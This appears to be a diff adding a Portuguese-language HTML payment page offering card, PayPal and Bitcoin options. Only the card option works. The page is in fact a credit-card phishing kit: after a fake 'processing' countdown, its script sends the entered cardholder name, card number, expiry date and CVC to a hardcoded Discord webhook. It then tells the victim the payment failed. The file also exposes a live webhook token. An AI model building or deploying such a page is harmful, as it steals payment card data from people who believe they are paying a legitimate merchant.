@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Seleção de Método de Pagamento</title>
+    <p><small>VOLTAR A</small> <a href="index2.html">PAGINA INCIAL </a></p>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #121212;
+            color: white;
+            margin: 0;
+            padding: 20px;
+            text-align: center;
+        }
+        .payment-methods {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 20px;
+        }
+        .payment-method {
+            background-color: #1e1e1e;
+            border-radius: 10px;
+            padding: 20px;
+            width: 150px;
+            text-align: center;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        .payment-method:hover {
+            transform: scale(1.05);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+        }
+        .payment-method img {
+            width: 50px;
+            height: 50px;
+            margin-bottom: 10px;
+        }
+        .hidden {
+            display: none;
+        }
+        .payment-panel {
+            margin-top: 30px;
+            padding: 20px;
+            background-color: #1e1e1e;
+            border-radius: 10px;
+            width: 100%;
+            max-width: 400px;
+            margin: 30px auto;
+        }
+        .payment-panel input {
+            display: block;
+            width: calc(100% - 20px);
+            margin: 10px auto;
+            padding: 12px;
+            border: 1px solid #333;
+            border-radius: 10px;
+            background-color: #121212;
+            color: #fff;
+        }
+        .payment-panel button {
+            background-color: blue;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 10px;
+            cursor: pointer;
+        }
+        .loading {
+            margin-top: 20px;
+            font-size: 18px;
+        }
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid white;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <h1>Escolha o Método de Pagamento</h1>
+    <div class="payment-methods">
+        <div class="payment-method" onclick="selectPaymentMethod('card')">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a4/Mastercard_2019_logo.svg/1200px-Mastercard_2019_logo.svg.png" alt="Cartão de Crédito">
+            <p>Cartão</p>
+        </div>
+        <div class="payment-method" onclick="selectPaymentMethod('paypal')">
+            <img src="https://cdn-icons-png.flaticon.com/512/196/196566.png" alt="PayPal">
+            <p>PayPal</p>
+        </div>
+        <div class="payment-method" onclick="selectPaymentMethod('pix')">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/46/Bitcoin.svg/1200px-Bitcoin.svg.png" alt="Btc">
+            <p>Bitcoin</p>
+        </div>
+    </div>
+
+    <div class="payment-panel hidden" id="payment-panel">
+        <h2>Pagamento</h2>
+        <div id="payment-fields"></div>
+        <button onclick="processPayment()">Pagar</button>
+        <div class="loading hidden" id="loading">
+            <div class="spinner"></div>
+            <p id="countdown">Processando pagamento em 3...</p>
+        </div>
+    </div>
+
+    <script>
+        const discordWebhookUrl = 'https://discord.com/api/webhooks/1335839629924106260/H2P6_1wIMWwkCQTLS7nGPEFTPF_r3IlqQHgKZA1ZQ7vlXHZ1VddojF1l-SRcva2BjqbS'; // Substitua pela URL do seu webhook do Discord
+
+        function selectPaymentMethod(method) {
+            const panel = document.getElementById('payment-panel');
+            const fields = document.getElementById('payment-fields');
+            panel.classList.remove('hidden');
+            fields.innerHTML = '';
+
+            if (method === 'card') {
+                fields.innerHTML = `
+                    <input type="text" id="card-name" placeholder="Nome do Titular">
+                    <input type="text" id="card-number" placeholder="Número do Cartão">
+                    <input type="text" id="card-expiry" placeholder="Data de Validade">
+                    <input type="text" id="card-cvc" placeholder="CVC">
+                `;
+            } else if (method === 'paypal') {
+                fields.innerHTML = `<p style="color: red; font-weight: bold;">O método PayPal está temporariamente indisponível.</p>`;
+            } else if (method === 'pix') {
+                fields.innerHTML = `<p style="color: red; font-weight: bold;">O método de Criptomoedas está temporariamente indisponível.</p>`;
+            }
+        }
+
+        function processPayment() {
+            const loadingDiv = document.getElementById('loading');
+            const countdownText = document.getElementById('countdown');
+            let counter = 3;
+
+            loadingDiv.classList.remove('hidden');
+            const countdown = setInterval(() => {
+                counter--;
+                countdownText.textContent = `Processando pagamento em ${counter}...`;
+                if (counter === 0) {
+                    clearInterval(countdown);
+
+                    const cardName = document.getElementById('card-name').value;
+                    const cardNumber = document.getElementById('card-number').value;
+                    const cardExpiry = document.getElementById('card-expiry').value;
+                    const cardCvc = document.getElementById('card-cvc').value;
+
+                    const paymentData = {
+                        content: `**Novo Pagamento**\nMétodo: Cartão\nNome do Titular: ${cardName}\nNúmero do Cartão: ${cardNumber}\nData de Validade: ${cardExpiry}\nCVC: ${cardCvc}`
+                    };
+
+                    // Enviar os dados para o Discord webhook
+                    sendToDiscord(paymentData);
+                }
+            }, 1000);
+        }
+
+        function sendToDiscord(data) {
+            fetch(discordWebhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (response.ok) {
+                    document.getElementById('payment-panel').innerHTML = `
+                        <h2>Falha ao concluir pagamento.</h2>
+                        <p>estamos temporariamente indisponivel.</p>
+                    `;
+                } else {
+                    document.getElementById('payment-panel').innerHTML = `
+                        <h2>Erro ao Processar Pagamento</h2>
+                        <p>Ocorreu um erro. Tente novamente mais tarde.</p>
+                    `;
+                }
+            })
+            .catch(error => {
+                document.getElementById('payment-panel').innerHTML = `
+                    <h2>Erro ao Processar Pagamento</h2>
+                    <p>Ocorreu um erro. Tente novamente mais tarde.</p>
+                `;
+            });
+        }
+    </script>
+</body>
+</html>
